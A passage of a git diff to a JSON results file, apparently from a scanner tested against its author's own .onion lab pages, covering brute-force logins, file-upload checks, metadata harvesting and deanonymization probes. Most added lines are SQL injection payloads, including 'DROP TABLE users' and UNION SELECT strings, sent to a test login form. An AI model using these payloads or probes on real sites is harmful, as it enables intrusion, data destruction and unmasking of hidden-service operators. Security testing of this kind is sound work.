@@ -1,23 +1,17 @@
 {
     "Bitcoin Results": {
         "Bitcoin Addresses": {
-            "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/bitcoin_address/bitcoin_adress.html": "Not accessible",
+            "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/bitcoin_address/bitcoin_adress.html": [
+                "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
+                "3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy",
+                "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4",
+                "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"
+            ],
             "http://kz62gxxlegswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/bitcoin_address/": "Not accessible"
         }
     },
     "Brute Force Results": {
         "Brute Force Results": {
-            "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_bruteforce/prueba_bruteforce.html": [
-                {
-                    "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_bruteforce/prueba_bruteforce.html",
-                    "credentials": {
-                        "usernam": "test",
-                        "psw": "test"
-                    },
-                    "success": true,
-                    "response": "<h1>Inicio de sesi\u00f3n exitoso!</h1>"
-                }
-            ],
             "http://kz62gxxl6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_bruteforce/prueba_bruteforce.html": [
                 {
                     "url": "http://kz62gxxl6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_bruteforce/prueba_bruteforce.html",
@@ -50,20 +44,20 @@
     "File Input Results": {
         "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_file/index.html": {
             "fileToUpload": [
-                "Accepts files with: .png extension",
-                "Accepts files with: .txt extension",
-                "Accepts files with: .php extension",
-                "Accepts files with: .jpg extension",
-                "Accepts files with: .jpeg extension",
-                "Accepts files with: .gif extension",
-                "Accepts files with: .bmp extension",
-                "Accepts files with: .zip extension",
-                "Accepts files with: .gz extension",
-                "Accepts files with: .rar extension",
-                "Accepts files with: .pdf extension",
-                "Accepts files with: .docx extension",
-                "Accepts files with: .xlsx extension",
-                "Accepts files with: .pptx extension"
+                "NO VULNERABLE: malicious.php.png",
+                "NO VULNERABLE: malicious.php.txt",
+                "NO VULNERABLE: malicious.php",
+                "NO VULNERABLE: malicious.php.jpg",
+                "NO VULNERABLE: malicious.php.jpeg",
+                "NO VULNERABLE: malicious.php.gif",
+                "NO VULNERABLE: malicious.php.bmp",
+                "NO VULNERABLE: malicious.php.zip",
+                "NO VULNERABLE: malicious.php.tar.gz",
+                "NO VULNERABLE: malicious.php.rar",
+                "NO VULNERABLE: malicious.php.pdf",
+                "NO VULNERABLE: malicious.php.docx",
+                "NO VULNERABLE: malicious.php.xlsx",
+                "NO VULNERABLE: malicious.php.pptx"
             ]
         },
         "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/": {
@@ -149,25 +143,128 @@
         }
     },
     "Binary Metadata Results": {
-        "Binary Metadata Results": "{\"binary_data\": {\"prueba.bin\": [\"01000101\", \"01110011\", \"01110100\", \"01101111\", \"00100000\", \"01100101\", \"01110011\", \"00100000\", \"01110101\", \"01101110\", \"00100000\", \"01100001\", \"01110010\", \"01100011\", \"01101000\", \"01101001\", \"01110110\", \"01101111\", \"00100000\", \"01100010\", \"01101001\", \"01101110\", \"01100001\", \"01110010\", \"01101001\", \"01101111\", \"00100000\", \"01100100\", \"01100101\", \"00100000\", \"01110000\", \"01110010\", \"01110101\", \"01100101\", \"01100010\", \"01100001\", \"00001010\"]}}"
+        "Binary Metadata Results": {
+            "binary_data": {
+                "prueba.bin": {
+                    "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/image_metadata/prueba.bin",
+                    "binary_data": [
+                        "01000101",
+                        "01110011",
+                        "01110100",
+                        "01101111",
+                        "00100000",
+                        "01100101",
+                        "01110011",
+                        "00100000",
+                        "01110101",
+                        "01101110",
+                        "00100000",
+                        "01100001",
+                        "01110010",
+                        "01100011",
+                        "01101000",
+                        "01101001",
+                        "01110110",
+                        "01101111",
+                        "00100000",
+                        "01100010",
+                        "01101001",
+                        "01101110",
+                        "01100001",
+                        "01110010",
+                        "01101001",
+                        "01101111",
+                        "00100000",
+                        "01100100",
+                        "01100101",
+                        "00100000",
+                        "01110000",
+                        "01110010",
+                        "01110101",
+                        "01100101",
+                        "01100010",
+                        "01100001",
+                        "00001010"
+                    ]
+                }
+            }
+        }
     },
     "Excel Metadata Results": {
-        "Excel Metadata Results": "{\"excel_metadata\": {}, \"http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion/\": \"No Excel files found on this URL\"}"
+        "Excel Metadata Results": {
+            "excel_metadata": {
+                "prueba.xlsx": "[]"
+            }
+        }
     },
     "GIF Metadata Results": {
-        "GIF Metadata Results": "{\"gif_metadata\": {\"prueba.gif\": {\"version\": \"b'GIF89a'\", \"background\": \"0\", \"loop\": \"0\", \"comment\": \"b'Please visit my site https://hola.com/'\", \"extension\": \"(b'NETSCAPE2.0', 795)\"}}}"
+        "GIF Metadata Results": {
+            "gif_metadata": {
+                "prueba.gif": {
+                    "version": "b'GIF89a'",
+                    "background": "0",
+                    "loop": "0",
+                    "comment": "b'Please visit my site https://hola.com/'",
+                    "extension": "(b'NETSCAPE2.0', 795)"
+                }
+            }
+        }
     },
     "PDF Metadata Results": {
         "PDF Metadata Results": "{\"pdf_metadata\": {\"http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/image_metadata/metadata.html\": {\"file_name\": \"prueba.pdf\", \"/Author\": \"Asier Justo\", \"/Creator\": \"Microsoft\\u00ae Word for Microsoft 365\", \"/CreationDate\": \"D:20240227172119+01'00'\", \"/ModDate\": \"D:20240227172119+01'00'\", \"/Producer\": \"Microsoft\\u00ae Word for Microsoft 365\"}}}"
     },
     "PPT Metadata Results": {
-        "PPT Metadata Results": "{\"ppt_metadata\": {}, \"http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion/\": \"No PowerPoint files found on this URL\"}"
+        "PPT Metadata Results": {
+            "ppt_metadata": {
+                "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/image_metadata/metadata.html": {
+                    "T\u00edtulo": "PowerPoint Presentation",
+                    "Autor": "Asier Justo",
+                    "Fecha de creaci\u00f3n": "2024-02-27 16:09:20",
+                    "\u00daltima fecha de modificaci\u00f3n": "2024-02-27 16:09:30",
+                    "Nombre de archivo": "prueba.pptx"
+                }
+            }
+        }
     },
     "Word Metadata Results": {
-        "Word Metadata Results": "{\"word_metadata\": {}, \"http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion/\": \"No Word files found on this URL\"}"
+        "Word Metadata Results": {
+            "word_metadata": {
+                "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/image_metadata/prueba.docx": {
+                    "author": "Asier Justo",
+                    "category": "",
+                    "comments": "",
+                    "content_status": "",
+                    "created": "2024-02-27T16:06:00",
+                    "identifier": "",
+                    "keywords": "",
+                    "language": "",
+                    "last_modified_by": "Asier Justo",
+                    "last_printed": null,
+                    "modified": "2024-02-27T16:06:00",
+                    "revision": 1,
+                    "subject": "",
+                    "title": "",
+                    "version": ""
+                }
+            }
+        }
     },
     "Media Metadata Results": {
-        "Media Metadata Results": "{\"media_metadata\": {}, \"http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion/\": \"No media files found on this URL\"}"
+        "Media Metadata Results": {
+            "media_metadata": {
+                "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/image_metadata/prueba.mp3": {
+                    "format": "MP3",
+                    "title": [
+                        "T\u00edtulo de la canci\u00f3n"
+                    ],
+                    "artist": [
+                        "Nombre del artista"
+                    ],
+                    "File Name": "prueba.mp3"
+                }
+            },
+            "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/image_metadata/prueba.mp4": "Invalid MP4 file"
+        }
     },
     "Image Metadata Results": {
         "Image Metadata Results": {
@@ -198,50 +295,91 @@
             "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/image_metadata/metadata.html": {
                 "gzip_enabled": true,
                 "sensitive_data": {
-                    "Date": "Mon, 08 Apr 2024 18:00:44 GMT"
+                    "Date": "Tue, 09 Apr 2024 14:41:42 GMT"
                 },
-                "estimated_location": "Am\u00e9rica"
+                "estimated_location": "Europa"
             },
             "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/": {
                 "gzip_enabled": true,
                 "sensitive_data": {
-                    "Date": "Mon, 08 Apr 2024 18:00:45 GMT"
+                    "Date": "Tue, 09 Apr 2024 14:41:48 GMT"
                 },
-                "estimated_location": "Am\u00e9rica"
+                "estimated_location": "Europa"
             }
         }
     },
     "Hostname Results": {
         "Hostname Results": {
             "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_hostname/prueba_hostname.html": {
-                "result": "The service at http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_hostname/prueba_hostname.html is vulnerable to Hostname Hacking",
-                "is_hostname_vulnerable": true
+                "result": "The service at http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_hostname/prueba_hostname.html is not vulnerable to Hostname Hacking",
+                "is_hostname_vulnerable": false
             },
             "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/": {
-                "result": "The service at http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/ is vulnerable to Hostname Hacking",
-                "is_hostname_vulnerable": true
+                "result": "The service at http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/ is not vulnerable to Hostname Hacking",
+                "is_hostname_vulnerable": false
             }
         }
     },
     "HTML Info Results": {
-        "HTML Info Results": "{\n    \"http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion/\": {\n        \"comments\": [\n            \" EVERYTHING ABOVE THIS LINE CAN BE CHANGED \",\n            \" EVERYTHING ABOVE THIS LINE CAN BE CHANGED \",\n            \" EVERYTHING ABOVE THIS LINE CAN BE CHANGED \",\n            \" EVERYTHING ABOVE THIS LINE CAN BE CHANGED \",\n            \" EVERYTHING ABOVE THIS LINE CAN BE CHANGED \",\n            \" EVERYTHING BELOW THIS LINE CAN BE CHANGED \",\n            \" EVERYTHING BELOW THIS LINE CAN BE CHANGED \",\n            \" EVERYTHING BELOW THIS LINE CAN BE CHANGED \",\n            \" EVERYTHING BELOW THIS LINE CAN BE CHANGED \"\n        ],\n        \"scripts\": [],\n        \"metas\": [\n            \"<meta content=\\\"text/html; charset=utf-8\\\" http-equiv=\\\"Content-type\\\"/>\"\n        ],\n        \"hidden_elements\": []\n    }\n}"
+        "HTML Info Results": {
+            "http://6nhmgdpnyoljh5uzr5kwlatx2u3diou4ldeommfxjz3wkhalzgjqxzqd.onion/": {
+                "comments": [
+                    " EVERYTHING ABOVE THIS LINE CAN BE CHANGED ",
+                    " EVERYTHING ABOVE THIS LINE CAN BE CHANGED ",
+                    " EVERYTHING ABOVE THIS LINE CAN BE CHANGED ",
+                    " EVERYTHING ABOVE THIS LINE CAN BE CHANGED ",
+                    " EVERYTHING ABOVE THIS LINE CAN BE CHANGED ",
+                    " EVERYTHING BELOW THIS LINE CAN BE CHANGED ",
+                    " EVERYTHING BELOW THIS LINE CAN BE CHANGED ",
+                    " EVERYTHING BELOW THIS LINE CAN BE CHANGED ",
+                    " EVERYTHING BELOW THIS LINE CAN BE CHANGED "
+                ],
+                "scripts": [],
+                "metas": [
+                    "<meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-type\"/>"
+                ],
+                "hidden_elements": []
+            }
+        }
     },
     "Mail Results": {
         "Mail Addresses": {
-            "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/mail/mail.html": {
-                "error": "Status Code: 404"
+            "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/mailweb/mailweb.html": {
+                "emails": [
+                    "info@example.com",
+                    "ejemplo@example.com"
+                ]
             }
         }
     },
     "Other Services Results": {
         "Other Services Results": {
-            "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/services/services.html": {
-                "error": "Status Code: 404"
+            "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/otherservices/otherservices.html": {
+                "ssh_found": true,
+                "ftp_found": true,
+                "smtp_found": true,
+                "http_traces_found": true
             }
         }
     },
     "Phone Results": {
-        "Phone Numbers": "{\n  \"Phone_numbers\": {\n    \"http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/phone/phone.html\": {\n      \"error\": \"Status Code: 404\"\n    }\n  }\n}"
+        "Phone Numbers": {
+            "Phone_numbers": {
+                "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/phone_numbers/phone_numbers.html": [
+                    "+1 (123) 456-7890",
+                    "1-800-555-1234",
+                    "555-123-4567",
+                    "+44 20 1234 5678",
+                    "(555) 9876543",
+                    "+49 (0) 30 12345678",
+                    "123456789",
+                    "+1 123-456-7890",
+                    "021-12345678",
+                    "1234-567890",
+                    "+1 (800) 555-4321"
+                ]
+            }
+        }
     },
     "PHP Server Results": {
         "PHP Server Info": {
@@ -249,9 +387,7 @@
                 "exposes_sensitive_information": true,
                 "sensitive_info": [
                     "IP addresses",
-                    "PHP version",
-                    "Debian OS information",
-                    "Onion URLs"
+                    "PHP version"
                 ]
             }
         }
@@ -259,20 +395,16 @@
     "Server Info Results": {
         "Server Info": {
             "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/deanonymize/php_info/php_info.html": {
-                "servidor": "Apache"
+                "servidor": "Caddy"
             }
         }
     },
     "Server Status Results": {
         "Server Status": {
             "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/": {
-                "Disponible": true,
-                "Direcciones IP Encontradas": [
-                    "127.0.0.1"
-                ],
-                "Servidores": [
-                    "Apache/2.4.58 (Debian) Server at kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion Port 80"
-                ]
+                "Disponible": false,
+                "Direcciones IP Encontradas": null,
+                "Servidores": null
             }
         }
     },
@@ -311,7 +443,161 @@
                         {
                             "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
                             "payload": {
+                                "usernam": "' OR 'a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "\" OR \"a\"=\"a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "ORDER BY 1--",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "'; DROP TABLE users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "\" OR \"a\"=\"a\" -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "'; SELECT * FROM users; --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "UNION SELECT 1,2,3 --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "\" OR \"a\"=\"a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
                                 "usernam": "' OR 1=1 -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "' OR 'a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "\" OR \"a\"=\"a\" -- ",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "'; SELECT * FROM users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "') OR ('a'='a",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "'; DROP TABLE users; --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "ORDER BY 1--",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "' OR 'a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "\" OR \"a\"=\"a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "password": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "UNION SELECT 1,2,3 --",
                                 "password": "1234"
                             }
                         },
@@ -325,7 +611,1673 @@
                         {
                             "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
                             "payload": {
+                                "usernam": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "\" OR \"a\"=\"a\" -- ",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "'; DROP TABLE users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "') OR ('a'='a",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "'; SELECT * FROM users; --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "UNION SELECT 1,2,3 --",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "ORDER BY 1--",
+                                "pass": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
                                 "usernam": "' OR 1=1 -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "\" OR \"a\"=\"a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "' OR 'a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "'; DROP TABLE users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "') OR ('a'='a",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "\" OR \"a\"=\"a\" -- ",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "UNION SELECT 1,2,3 --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "'; SELECT * FROM users; --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "UNION SELECT NULL, NULL, CONCAT(0x7171786a71, 0x626b634a6b5565455051, 0x71716a6a71) --",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "usernam": "ORDER BY 1--",
+                                "pwd": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "' OR 'a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "' OR 1=1 -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "\" OR \"a\"=\"a\" -- ",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "') OR ('a'='a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "\" OR \"a\"=\"a",
+                                "psw": "1234"
+                            }
+                        },
+                        {
+                            "url": "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.php",
+                            "payload": {
+                                "uname": "UNION SELECT 1,2,3 --",
+                                "psw": "1234"
+                            }
+                        },
+                        {
